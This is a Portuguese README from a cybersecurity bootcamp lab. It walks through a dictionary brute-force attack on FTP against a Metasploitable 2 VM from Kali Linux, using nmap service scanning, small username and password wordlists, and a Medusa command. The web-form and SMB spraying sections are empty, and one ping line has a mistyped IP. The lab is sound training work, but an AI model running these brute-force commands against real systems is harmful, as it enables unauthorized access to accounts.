# Simulando um Ataque de Brute Force de Senhas com Medusa e Kali Linux

Um projeto do bootcamp Riachuelo Cibersegurança na plataforma de ensino DIO.
1. ![Força bruta em FTP](https://github.com/flanubit/DIO-brute-force-com-medusa-na-vm-metasploitable-2/blob/main/README.md#for%C3%A7a-bruta-em-ftp)
2. Automação de tentativas em formulário Web
3. Password Spraying em SMB

## Força bruta em FTP

Use **msfadmin** como usuário e senha na vm Metasploitable 2:

![](https://github.com/flanubit/brute-force-com-medusa-na-vm-metasploitable-2-DIO/blob/main/images/Captura%20de%20tela%202026-03-05%20215519.png)

Confira o o IP da máquina Metasploitable 2 usando o comando:
~~~bash
ip addr
~~~
Neste caso o ip é **192.168.56.102**:

![](https://github.com/flanubit/brute-force-com-medusa-na-vm-metasploitable-2-DIO/blob/main/images/Captura%20de%20tela%202026-03-05%20215619.png)

Abra a outra vm com o Kali Linux instalado, e seguida use o comando
~~~bash
ping -c 3 198.168.56.102
~~~
Enviando 3 pacotes ping e testar conexão com a vm Metasploitable 2:

![](https://github.com/flanubit/brute-force-com-medusa-na-vm-metasploitable-2-DIO/blob/main/images/Screenshot_2026-03-05_19-57-08.png)

Após o **ping** use o comando:
~~~bash
nmap -sV -p 21,22,80,445,139 192.168.56.102
~~~
Este comando procura pelas portas informadas com o parâmetro **-p**, verifica se estão abertas e qual versão do serviço estão executando nelas com o parâmetro **-sV**:

![](https://github.com/flanubit/brute-force-com-medusa-na-vm-metasploitable-2-DIO/blob/main/images/Screenshot_2026-03-05_20-01-11.png)

Agora tente se conectar ao serviço **FTP** na vm Metasploitable 2 usando o comando:
~~~bash
ftp 192.168.56.102
~~~
Você verá uma tela semelhante a essa abaixo se houver conexão, porém ainda não sabemos o usuário e senha para acessar:

![](https://github.com/flanubit/brute-force-com-medusa-na-vm-metasploitable-2-DIO/blob/main/images/Screenshot_2026-03-05_20-04-09.png)

Vamos usar um ataque com dicionário contra o protocolo FTP criando nossa lista de palavras com o comando abaixo:
~~~bash
echo -e "user\nmsfadmin\nadmin\nroot" > usuarios.txt
echo -e "123456\npassword\nqwerty\nmsfadmin" > senhas.txt
~~~

![](https://github.com/flanubit/DIO-brute-force-com-medusa-na-vm-metasploitable-2/blob/main/images/Screenshot_2026-03-05_20-09-50.png)

Usando o Medusa para um ataque de força bruta com a lista de senhas e usuario que criamos, comando abaixo:
~~~bash
medusa -h 192.168.56.102 -U usuarios.txt -P senhas.txt -M ftp -t 6 | grep 'SUCCESS'
~~~
Que nos retornará com o usuário e senha que obeteve sucesso de login. Tente novamente a conexão FTP e use as credenciais encontradas:

![](https://github.com/flanubit/DIO-brute-force-com-medusa-na-vm-metasploitable-2/blob/main/images/Screenshot_2026-03-05_20-23-29.png)

## Automação de tentativas em formulário Web

...

## Password Spraying em SMB

...
